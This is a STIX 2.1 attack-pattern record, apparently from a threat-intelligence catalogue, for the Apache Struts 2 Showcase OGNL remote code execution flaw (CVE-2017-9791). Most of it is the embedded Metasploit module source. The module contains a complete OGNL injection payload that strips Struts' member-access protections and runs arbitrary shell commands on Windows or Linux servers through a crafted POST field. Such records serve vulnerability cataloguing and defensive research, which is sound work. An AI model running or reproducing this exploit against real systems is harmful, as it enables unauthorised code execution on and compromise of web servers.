{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7d72048f-8839-42e2-81ac-c05bf0c04a53",
    "created": "2024-08-14T17:09:41.887098Z",
    "modified": "2024-08-14T17:09:41.887102Z",
    "name": "Apache Struts 2 Struts 1 Plugin Showcase OGNL Code Execution",
    "description": "This module exploits a remote code execution vulnerability in the Struts Showcase app in the Struts 1 plugin example in Struts 2.3.x series. Remote Code Execution can be performed via a malicious field value. 'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/struts2_code_exec_showcase.rb",
            "external_id": "struts2_code_exec_showcase.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-9791"
        },
        {
            "source_name": "reference",
            "url": "https://cwiki.apache.org/confluence/display/WW/S2-048"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Apache Struts 2 Struts 1 Plugin Showcase OGNL Code Execution',\n      'Description'    => %q{ This module exploits a remote code execution vulnerability in the Struts Showcase app in the Struts 1 plugin example in Struts 2.3.x series. Remote Code Execution can be performed via a malicious field value. },\n      'License'        => MSF_LICENSE,\n      'Author'         => [\n        'icez <ic3z at qq dot com>',\n        'Nixawk',\n        'xfer0'\n      ],\n      'References'     => [\n        [ 'CVE', '2017-9791' ],\n        [ 'BID', '99484' ],\n        [ 'EDB', '42324' ],\n        [ 'URL', 'https://cwiki.apache.org/confluence/display/WW/S2-048'  ]\n      ],\n      'Privileged'     => true,\n      'Targets'        => [\n        [\n          'Universal', {\n            'Platform'       => %w{ linux unix win },\n            'Arch'           => [ ARCH_CMD ]\n          }\n        ]\n      ],\n      'DisclosureDate' => '2017-07-07',\n    'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n        OptString.new('TARGETURI', [ true, 'The path to a struts application action', '/struts2-showcase/integration/saveGangster.action' ]),\n        OptString.new('POSTPARAM', [ true, 'The HTTP POST parameter', 'name' ])\n      ]\n    )\n  end\n\n  def send_struts_request(ognl)\n    var_a = rand_text_alpha_lower(4)\n    var_b = rand_text_alpha_lower(4)\n    uri = normalize_uri(datastore['TARGETURI'])\n\n    data = {\n      datastore['POSTPARAM']    => ognl,\n      'age'                     => var_a,\n      '__checkbox_bustedBefore' => 'true',\n      'description'             => var_b\n    }\n\n    resp = send_request_cgi({\n      'uri'       => uri,\n      'method'    => 'POST',\n      'vars_post' => data\n    })\n\n    if resp && resp.code == 404\n      fail_with(Failure::BadConfig, 'Server returned HTTP 404, please double check TARGETURI')\n    end\n    resp\n  end\n\n  def check\n    var_a = rand_text_alpha_lower(4)\n    var_b = rand_text_alpha_lower(4)\n    ognl = \"%{'#{var_a}' + '#{var_b}'}\"\n\n    begin\n      resp = send_struts_request(ognl)\n    rescue Msf::Exploit::Failed\n      return Exploit::CheckCode::Unknown\n    end\n\n    if resp && resp.code == 200 && resp.body.include?(\"#{var_a}#{var_b}\")\n      Exploit::CheckCode::Vulnerable\n    else\n      Exploit::CheckCode::Safe\n    end\n  end\n\n  def exploit\n    resp = exec_cmd(payload.encoded)\n    unless resp and resp.code == 200\n      fail_with(Failure::Unknown, \"Exploit failed.\")\n    end\n\n    print_good(\"Command executed\")\n    print_line(resp.body)\n  end\n\n  def exec_cmd(cmd)\n    ognl = \"%{(#_='multipart/form-data').\"\n    ognl << \"(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).\"\n    ognl << \"(#_memberAccess?(#_memberAccess=#dm):\"\n    ognl << \"((#container=#context['com.opensymphony.xwork2.ActionContext.container']).\"\n    ognl << \"(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).\"\n    ognl << \"(#ognlUtil.getExcludedPackageNames().clear()).\"\n    ognl << \"(#ognlUtil.getExcludedClasses().clear()).\"\n    ognl << \"(#context.setMemberAccess(#dm)))).\"\n    ognl << \"(#cmd='#{cmd}').\"\n    ognl << \"(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).\"\n    ognl << \"(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).\"\n    ognl << \"(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).\"\n    ognl << \"(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\"\n\n    send_struts_request(ognl)\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-07-07",
    "x_mitre_platforms": [
        "%w{ linux unix win }"
    ]
}